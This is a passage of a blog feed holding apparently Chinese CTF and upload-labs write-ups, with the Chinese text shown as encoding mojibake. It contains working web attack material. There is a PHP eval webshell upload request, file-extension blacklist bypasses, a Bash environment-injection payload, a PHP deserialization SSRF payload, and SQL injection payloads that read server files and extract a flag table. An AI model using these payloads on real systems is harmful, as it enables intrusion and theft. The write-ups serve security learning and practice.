class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹è§è¿™é‡Œæ˜¯å…ˆæŠŠæ–‡ä»¶ä¿å­˜ä¸‹æ¥å†è¿›è¡Œåˆ¤æ–­, å› æ­¤å¯ä»¥è¿›è¡Œæ¡ä»¶ç«äº‰</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181755245.png" alt="image-20240222181755245"></p><p><img src="C:/Users/hcj/AppData/Roaming/Typora/typora-user-images/image-20240222181811015.png" alt="image-20240222181811015"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240222181820037.png" alt="image-20240222181820037"></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>è¿™é‡Œä¸èƒ½å†ä½¿ç”¨phpæ–‡ä»¶äº†, å› ä¸ºæœåŠ¡å™¨ä¼šæ¯”å¯¹åç¼€ååå†å†³å®šæ˜¯å¦ä¿å­˜,</p><p>è¿™é‡Œç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153402676.png" alt="image-20240223153402676"></p><p>å¯ä»¥ç”¨ç”¨æ–‡ä»¶åŒ…å«æ¥æ¡ä»¶ç«äº‰æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223153322537.png" alt="image-20240223153322537"></p><h2 id="Pass-19-move-uploaded-file-ç‰¹æ€§"><a href="#Pass-19-move-uploaded-file-ç‰¹æ€§" class="headerlink" title="Pass-19(move_uploaded_file()ç‰¹æ€§)"></a>Pass-19(move_uploaded_file()ç‰¹æ€§)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¾ç„¶æ˜¯é»‘åå•ç»•è¿‡, ä½†æ˜¯ä¿å­˜çš„æ–‡ä»¶åæ˜¯å¯æ§åˆ¶çš„</p><p>è¿™é‡Œç”¨åˆ°ä¸€ä¸ªå‡½æ•°ç‰¹æ€§:</p><p>move_uploaded_file()ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ <code>/.</code></p><p>æ‰€ä»¥æ„é€ .php&#x2F;.æ¥ç»•è¿‡é»‘åå•, ç»è¿‡move_uploaded_file()ååˆå˜å›äº†.php</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154404013.png" alt="image-20240223154404013"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223154416422.png" alt="image-20240223154416422"></p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>ä¸»è¦åœ¨äºè¿™ä¸¤å¥:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªéœ€è¦ä¼ å…¥æ•°ç»„å°±å¯ä»¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>reset()ä¼šè¿”å›æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼, count()è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°</p><p>æˆ‘ä»¬åªéœ€è¦ä½¿å¾—reset($file)&#x3D;&#x3D;xxx.php; $file[count($file) - 1]&#x3D;&#x3D;ç©ºå€¼ å°±å¯ä»¥æ„é€ å‡ºä¸€ä¸ªphpæ–‡ä»¶å</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155819310.png" alt="image-20240223155819310"></p><p>æ­¤æ—¶æ•°ç»„å†…æœ‰ä¸¤ä¸ªå…ƒç´ , è€Œ2-1&#x3D;1 ç´¢å¼•ä¸º1çš„å…ƒç´ å€¼ä¸ºç©ºå€¼</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223155829766.png" alt="image-20240223155829766"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Upload-labs&quot;&gt;&lt;a href=&quot;#Upload-labs&quot; class=&quot;headerlink&quot; title=&quot;Upload-labs&quot;&gt;&lt;/a&gt;Upload-labs&lt;/h1&gt;&lt;p&gt;ç½‘ä¸Šæœ‰21å…³çš„å’Œ20å…³ä¸¤ç§,åœ¨è¿™é‡Œä»¥buu upload-labs </summary>
      
    
    
    
    <category term="é¶åœº" scheme="http://example.com/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>SICTF-Round-3</title>
    <link href="http://example.com/2024/02/19/SICTF-Round-3/"/>
    <id>http://example.com/2024/02/19/SICTF-Round-3/</id>
    <published>2024-02-19T04:30:42.000Z</published>
    <updated>2024-02-19T04:34:50.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="100ï¼…-upload"><a href="#100ï¼…-upload" class="headerlink" title="100ï¼…_upload"></a>100ï¼…_upload</h2><p>é¦–å…ˆæ„é€ åç¼€å.php.</p><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yuanshen.life:36177</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------291815788614695660121094840087</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://yuanshen.life:36177</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yuanshen.life:36177/index.php?file=index.php</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upfile&quot;; filename=&quot;3.php.&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">&lt;?= @eval($_POST[<span class="string">&#x27;nacl&#x27;</span>]);?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">æäº¤</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">-----------------------------291815788614695660121094840087--</span></span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æœ¨é©¬åç›´æ¥ç”¨ä»»æ„æ–‡ä»¶åŒ…å«æ¥è§¦å‘æœ¨é©¬</p><p>è¿™é‡Œä½¿ç”¨èšå‰‘è¿æ¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112135730.png" alt="image-20240217112135730"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240217112200847.png" alt="image-20240217112200847"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:37269/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg;%20&#125;</span><br><span class="line"></span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJ3b3JyaWVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>å‚è€ƒ:</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line">        <span class="variable">$payload</span> = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Exploit&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// hint:hide other file</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Harder&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">You don<span class="string">&#x27;t know how to pass parameters?</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æ‰«å‡ºæ¥ä¸€ä¸ªadmin.php,æœ¬åœ°è®¿é—®admin.phpå¯ä»¥æ‹¿åˆ°flag</p><p>æ‰€ä»¥payloadä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38434/</span><br><span class="line">?Harder=O:6:&quot;client&quot;:2:&#123;s:3:&quot;url&quot;;s:26:&quot;http://127.0.0.1/admin.php&quot;;s:7:&quot;payload&quot;;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">client</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/admin.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">client</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br></pre></td></tr></table></figure><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>fuzzä¸€ä¸‹ä¼šå‘ç°ç¦äº†information_schema,or,andè¿™äº›</p><p>é¦–å…ˆå¯ä»¥load_fileè¯»å–æºç </p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27;/**/union/**/select/**/load_file(&#x27;/var/www/html/index.php&#x27;)/**/%23</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--flagåœ¨flagè¡¨é‡Œ--&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºè¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$sensitive_keywords</span> = <span class="keyword">array</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;handler&quot;</span>, <span class="string">&quot;like&quot;</span>, <span class="string">&quot;or&quot;</span>, <span class="string">&quot;-~&quot;</span>, <span class="string">&quot;--&quot;</span>, <span class="string">&quot;--+&quot;</span>, <span class="string">&quot;information&quot;</span>, <span class="string">&quot;xor&quot;</span>, <span class="string">&quot;and&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;order&quot;</span>, <span class="string">&quot;floor&quot;</span>,<span class="string">&quot;sys_tables&quot;</span>,<span class="string">&quot;sys_columns&quot;</span>,<span class="string">&quot;sys.schema_table_statistics_with_buffer&quot;</span>,<span class="string">&quot;sys.schema_table_statistics&quot;</span>,<span class="string">&quot;mid&quot;</span>, <span class="string">&quot;ascii&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥å‚æ•°ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿå…³é”®è¯</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$sensitive_keywords</span> <span class="keyword">as</span> <span class="variable">$keyword</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="variable">$keyword</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœå‚æ•°ä¸­åŒ…å«æ•æ„Ÿå…³é”®è¯ï¼Œå¼¹çª—æç¤ºç”¨æˆ·</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;hacker&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="comment">// å¯ä»¥é€‰æ‹©ç»ˆæ­¢è„šæœ¬æ‰§è¡Œæˆ–è€…åšå…¶ä»–å¤„ç†</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id from flag where id=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// è¾“å‡ºæ¯ä¸€è¡Œè®°å½•çš„ love å­—æ®µå€¼</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;          &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 ç»“æœ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo $result-&gt;num_rows;</span></span><br><span class="line"><span class="comment">// å…³é—­æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªè¾“å‡ºé›¶æ—¶è¡¨ä¸­çš„idå­—æ®µ,ä¸”flagæ‰€åœ¨çš„åˆ—åæœªçŸ¥</p><p>è¿™é‡Œè€ƒå¯Ÿäº†æ— åˆ—åæ³¨å…¥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=flag&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.20.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 18 Feb 2024 11:14:38 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/7.3.33</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>249</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">joeå¥½åƒå–œæ¬¢aliceï¼Œä½†æ˜¯aliceå¥½åƒä¸å–œæ¬¢joeï¼Œä½ è¦ä¸è¦æŸ¥æŸ¥ä»–ä»¬éƒ½å–œæ¬¢è°(?username=joe)æˆ–è€…(?username=alice)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span 